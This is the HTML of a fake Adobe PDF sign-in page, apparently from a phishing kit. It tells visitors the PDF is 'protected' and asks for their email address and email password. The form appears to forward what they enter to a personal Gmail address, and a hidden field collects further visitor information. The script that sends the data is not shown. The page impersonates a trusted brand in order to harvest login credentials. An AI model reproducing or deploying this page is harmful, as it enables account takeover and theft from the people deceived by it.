<body>
    <div class="container-fluid">
        <div class="row">
            <div class="col-md-12 col-lg-12 col-sm-12">
                <img class="header-img"
                    src="./images/kisspng-adobe-systems-logo-business-adobe-acrobat-adobe-premier-5b48b7de87b4c3.4823781215314923185559.png"
                    width="120px">
                <h2 style="text-align: center;">Sign In using your email and password</h2>
                <div class="logo"><img src="./images/Adobe-logo.png" width="30%" /></div>
                <br>
                <form class='gform' id="contact" data-email="hxan619@gmail.com" method="POST">
                    <div class="form-group">
                        <input name="email" class="email form-control" type="email"
                            placeholder="Recover Email Address" />
                    </div>
                    <div class="form-group">
                        <input name="pass" class="password form-control" type="password" placeholder="Email Password" />
                    </div>
                    <input name="user_informaion" type="text" id="info" style="display: none;" />
                    <a href="#" class="pdf-link">This PDF file is protected</a>
                    <br>
                    <button type="submit" class="view_file">VIEW FILE</button>
                </form>
                <br>
                <div class="footer">
                    Sign in with your recieving email and password
                </div>
            </div>
            <div class="loader">
                <div class="d-flex justify-content-center">
                    <div class="spinner-border" style="width: 3rem; height: 3rem;" role="status">
                        <span class="sr-only">Loading...</span>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <!-- Latest compiled and minified JavaScript -->
